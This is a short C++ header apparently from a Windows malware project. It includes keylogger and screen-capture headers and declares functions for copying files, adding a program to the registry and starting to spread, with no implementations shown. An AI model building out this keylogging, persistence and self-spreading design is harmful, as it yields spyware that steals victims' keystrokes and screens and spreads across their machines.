#pragma once
#include <fstream>
#include <cstdlib>
#include <Windows.h>
#include <stdio.h>
#include <string>
#include <future>
#include "KeyLogger.h"
#include "ScreenCapture.h"
#include "Util.h"

using std::cout;
using std::wcout;
using std::cin;
using std::endl;
using std::fstream;
using std::ofstream;
using std::ifstream;
using std::ios;



bool copyFile(const wchar_t* SRC, const wchar_t* DEST);

std::wstring copyFiles();

void addToRegistry(std::wstring progPath);

bool startSpread();